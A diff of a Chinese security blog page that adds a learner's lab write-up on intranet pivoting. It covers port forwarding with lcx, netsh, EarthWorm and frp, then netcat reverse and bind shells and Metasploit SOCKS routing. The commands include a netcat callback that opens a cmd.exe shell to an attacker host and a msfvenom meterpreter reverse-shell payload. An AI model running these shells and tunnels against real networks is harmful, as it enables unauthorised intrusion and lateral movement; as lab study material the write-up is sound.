@@ -255,6 +255,203 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">内网渗透端口转发总结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-09-12 16:32:27" itemprop="dateCreated datePublished" datetime="2022-09-12T16:32:27+08:00">2022-09-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-08 01:26:58" itemprop="dateModified" datetime="2022-12-08T01:26:58+08:00">2022-12-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="内网渗透端口转发总结"><a href="#内网渗透端口转发总结" class="headerlink" title="内网渗透端口转发总结"></a>内网渗透端口转发总结</h1><p>前言：之前渗透的时候，用些工具都是模模糊糊的，这次看到个不错的文章，想一次性解决这个问题。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42490383/article/details/109429764?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-109429764-blog-110393906.pc_relevant_default&spm=1001.2101.3001.4242.1&utm_relevant_index=3">(100条消息) VMware LAN区段网络设置_墨笔夺魂的博客-CSDN博客_lan区段</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yang558855/article/details/110393906">(100条消息) VMware虚拟机网卡LAN区段模拟内网_自然之龙的博客-CSDN博客_lan区段</a></p>
+<h1 id="windows版lcx介绍"><a href="#windows版lcx介绍" class="headerlink" title="windows版lcx介绍"></a>windows版lcx介绍</h1><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653017320_62870ae8645fbf7f153e3.png" alt="img"></p>
+<p>环境如上，当然不是和他一样的，内网机是192.168.0.127</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912141223474.png" alt="image-20220912141223474"></p>
+<p>外面ping不通，里面可以ping通。已模拟内网环境，他妈的我搭靶场的时候怎么就没有想到用这个lan网段。o(╥﹏╥)o</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">受害机执行</span><br><span class="line">lcx.exe -slave 192.168.112.1 5333 172.16.1.2 3389</span><br><span class="line">表将内网机（172.16.1.2:3389）转发到攻击机（192.168.112.1:5333）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机执行</span><br><span class="line">lcx.exe -listen 5333 5555，表将“监听到5333端口的流量”转发至5555端口上。</span><br></pre></td></tr></table></figure>
+
+<p>最后在攻击机上登录，本机ip:5555</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912145915071.png"></p>
+<h1 id="netsh端口映射"><a href="#netsh端口映射" class="headerlink" title="netsh端口映射"></a>netsh端口映射</h1><p>这个只是把本机的某个端口映射到另外一个ip地址上面，只要访问本机的这个端口就可以了。但是访问外网ip是没得办法直接连的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=7777 connectaddress=192.168.112.144 connectport=3389</span><br><span class="line"></span><br><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653017809_62870cd130601ffb48553.png" alt="img"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912151949136.png" alt="image-20220912151949136"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy reset //删除端口转发</span><br><span class="line"></span><br><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>
+
+<h1 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h1><p>内网穿透神器EarthWorm（EW），功能强大的网络穿透工具，具有socks5代理、端口转发，端口映射三大功能</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912152035101.png" alt="image-20220912152035101"></p>
+<h2 id="正向socks-v5"><a href="#正向socks-v5" class="headerlink" title="正向socks v5"></a>正向socks v5</h2><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912152223873.png" alt="image-20220912152223873"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912152524235.png" alt="image-20220912152524235"></p>
+<p>大概就是这样喵</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">win7上执行：ew_win32.exe -s lcx_tran -l 1080 -f 172.16.1.3 -g 3389</span><br><span class="line">解释：将172.16.1.3:3389代理到win7的1080端口。</span><br></pre></td></tr></table></figure>
+
+<p>然后攻击机访问win7的1080端口就可以实现代理喵。</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912152715252.png" alt="image-20220912152715252"></p>
+<h2 id="反向socks-v5-proxifier"><a href="#反向socks-v5-proxifier" class="headerlink" title="反向socks v5+proxifier"></a>反向socks v5+proxifier</h2><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018383_62870f0f9f3b794159ff6.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">物理机执行</span><br><span class="line">ew_win32.exe -s rcsocks -l 1080 -e 8888</span><br><span class="line">监听1080端口，并接收8888端口的流量。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">跳板机执行</span><br><span class="line">ew_win32.exe -s rssocks -d 192.168.100.1 -e 8888</span><br><span class="line">跳板机作为ssocks，和物理机8888建立连接。</span><br></pre></td></tr></table></figure>
+
+<p>proxifier配置代理服务器为127.0.0.1:1080</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912153327767.png" alt="image-20220912153327767"></p>
+<p>这样就可以直接连接到内网的机器了</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912153359153.png" alt="image-20220912153359153"></p>
+<p>要是代理关掉就连不上了</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912153436429.png" alt="image-20220912153436429"></p>
+<h2 id="二级内网穿透"><a href="#二级内网穿透" class="headerlink" title="二级内网穿透"></a>二级内网穿透</h2><p>这个我就没有复现了。暂时用不到。</p>
+<h3 id="lcx-tran用法"><a href="#lcx-tran用法" class="headerlink" title="lcx_tran用法"></a>lcx_tran用法</h3><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018640_628710106ca3f5c0288ce.png" alt="1653018640_628710106ca3f5c0288ce.png!small?1653018641846"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018649_628710191786de1f5e152.png" alt="1653018649_628710191786de1f5e152.png!small?1653018650516"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018658_62871022bd4575a4b753e.png" alt="1653018658_62871022bd4575a4b753e.png!small?1653018660246"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018681_62871039bf0b8f0c15f66.png!small" alt="1653018681_62871039bf0b8f0c15f66.png"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018689_628710412b40868d11805.png" alt="1653018689_628710412b40868d11805.png!small?1653018690778"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018695_6287104763d6d348a47ca.png" alt="1653018695_6287104763d6d348a47ca.png!small?1653018696848"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018705_6287105155d0356bda8cf.png" alt="1653018705_6287105155d0356bda8cf.png!small?1653018706836"></p>
+<h3 id="lcx-listen-lcx-slave"><a href="#lcx-listen-lcx-slave" class="headerlink" title="lcx_listen lcx_slave"></a>lcx_listen lcx_slave</h3><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018724_6287106447d70c9f97d12.png" alt="1653018724_6287106447d70c9f97d12.png!small?1653018725702"></p>
+<p>win10:ew_win32.exe -s lcx_listen -l 1080 -e 8888</p>
+<p>2-win2012:ew_win32.exe -s ssocksd -l 9999</p>
+<p>1-win2012:ew_win32.exe -s lcx_slave -d 192.168.112.1 -e 8888 -f 172.16.1.6 -g 9999</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018754_6287108299050b3e2e219.png" alt="1653018754_6287108299050b3e2e219.png!small?1653018756085"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018776_6287109840a9e8608c92f.png" alt="1653018776_6287109840a9e8608c92f.png!small?1653018777711"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018786_628710a245549999e8536.png" alt="1653018786_628710a245549999e8536.png!small?1653018787769"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018799_628710af95311c82220c0.png" alt="1653018799_628710af95311c82220c0.png!small?1653018801224"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018808_628710b88e21cba662216.png" alt="1653018808_628710b88e21cba662216.png!small?1653018810152"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018824_628710c8a059170b5f4c7.png" alt="1653018824_628710c8a059170b5f4c7.png!small?1653018826062"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018836_628710d43ce65782870ca.png" alt="1653018836_628710d43ce65782870ca.png!small?1653018837769"></p>
+<h1 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h1><h2 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h2><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653018870_628710f68444bc378f0f9.png" alt="1653018870_628710f68444bc378f0f9.png!small?1653018871952"></p>
+<p>也就是弹个shell过来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机先监听</span><br><span class="line">nc64.exe -lvp 12345</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">受害者</span><br><span class="line">nc64.exe -e cmd.exe 172.16.1.5 12345</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912160159331.png" alt="image-20220912160159331"></p>
+<p>成功</p>
+<h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">受害者</span><br><span class="line">nc64.exe -lvp 12345 -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击者</span><br><span class="line">nc64.exe 172.16.1.6 12345</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/image-20220912160436671.png" alt="image-20220912160436671"></p>
+<p>成功</p>
+<h1 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h1><p>这个也没复现了,偷别人的图</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019015_628711872bcf8e6f9ba01.png" alt="1653019015_628711872bcf8e6f9ba01.png!small?1653019016569"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> frpc.ini配置文件</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line"></span><br><span class="line">server_addr = 192.168.112.1</span><br><span class="line"></span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">token = 123</span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line"></span><br><span class="line">type = tcp</span><br><span class="line"></span><br><span class="line">remote_port = 8899</span><br><span class="line"></span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019048_628711a8d2cb0a3f7ab07.png" alt="1653019048_628711a8d2cb0a3f7ab07.png!small?1653019050293"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frps.ini配置文件</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line"></span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line"></span><br><span class="line">bind_port = 7000</span><br><span class="line"></span><br><span class="line">token = 123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019070_628711be4ca61a1d94286.png" alt="1653019070_628711be4ca61a1d94286.png!small?1653019071699"></p>
+<p>命令执行</p>
+<p>先运行：frps.exe -c frps.ini</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019107_628711e3822b0d0c5be10.png" alt="1653019107_628711e3822b0d0c5be10.png!small?1653019109087"></p>
+<p>再运行：frpc.exe -c frpc.ini</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019133_628711fd95642caace23d.png" alt="1653019133_628711fd95642caace23d.png!small?1653019134996"></p>
+<p>本机配代理Proxifier</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019145_62871209d4269eaa510bb.png" alt="1653019145_62871209d4269eaa510bb.png!small?1653019147326"></p>
+<p>远程连接测试成功</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019156_628712147f144f722b79e.png" alt="1653019156_628712147f144f722b79e.png!small?1653019157954"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019166_6287121e510cc64335a13.png" alt="1653019166_6287121e510cc64335a13.png!small?1653019167788"></p>
+<h1 id="MSF-socks隧道代理"><a href="#MSF-socks隧道代理" class="headerlink" title="MSF socks隧道代理"></a>MSF socks隧道代理</h1><p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019182_6287122ec9cb3642487e4.png" alt="1653019182_6287122ec9cb3642487e4.png!small?1653019184228"></p>
+<p>假设已获取winserver2008的服务器权限，用msf做演示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf生成exe木马控winserver2008</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.190.129 LPORT=12345 -f exe &gt; ./WinSer2008.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019218_62871252869d7b441dadb.png" alt="1653019218_62871252869d7b441dadb.png!small?1653019220085"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">set LHOST 192.168.190.129</span><br><span class="line"></span><br><span class="line">set LPORT 12345</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019230_6287125e7d4f18a99d5e3.png" alt="1653019230_6287125e7d4f18a99d5e3.png!small?1653019232077"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019264_6287128032b424f0dacb4.png" alt="1653019264_6287128032b424f0dacb4.png!small?1653019266022"></p>
+<p>然后添加路由：<code>run autoroute -s 172.16.1.0</code></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019277_6287128ddeec5a1833d50.png" alt="1653019277_6287128ddeec5a1833d50.png!small?1653019279452"></p>
+<p>然后查看添加的路由：<code>run autoroute -p</code></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019301_628712a5cd1cee9b3e7fd.png" alt="1653019301_628712a5cd1cee9b3e7fd.png!small?1653019303373"></p>
+<p><code>background</code></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019328_628712c0c8e3eab8cc5f6.png" alt="1653019328_628712c0c8e3eab8cc5f6.png!small?1653019330223"></p>
+<p>然后搜索可以做代理的模块，并使用它：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search socks_proxy</span><br><span class="line"></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">set username admin</span><br><span class="line"></span><br><span class="line">set password 123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019364_628712e47a421d4f19b9b.png" alt="1653019364_628712e47a421d4f19b9b.png!small?1653019365960"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019375_628712ef490fb48013c5a.png" alt="1653019375_628712ef490fb48013c5a.png!small?1653019377272"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019380_628712f4a2b2df36ba7a6.png" alt="1653019380_628712f4a2b2df36ba7a6.png!small"></p>
+<p>然后run</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019410_62871312a890fc84de419.png" alt="1653019410_62871312a890fc84de419.png!small?1653019412131"></p>
+<p>windows下proxifer测试。</p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019427_628713239297600f2ee97.png" alt="1653019427_628713239297600f2ee97.png!small?1653019429047"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019440_628713304156956afbbfb.png" alt="1653019440_628713304156956afbbfb.png!small?1653019441799"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019450_6287133a1a0081a59de2e.png" alt="1653019450_6287133a1a0081a59de2e.png!small?1653019451548"></p>
+<p><code>vi /etc/proxychains.conf</code></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019478_62871356384770324c66b.png" alt="1653019478_62871356384770324c66b.png!small?1653019479666"></p>
+<p><img src="/2022/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/1653019488_62871360e4ffdfe6d4efe.png" alt="1653019488_62871360e4ffdfe6d4efe.png!small?1653019490395"></p>
+<p>我这没复现成功啊，不知道原因，过程和原理都是对的。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -744,89 +941,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/09/06/%E7%94%A8%E5%8F%8BGRP-U8-OA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-
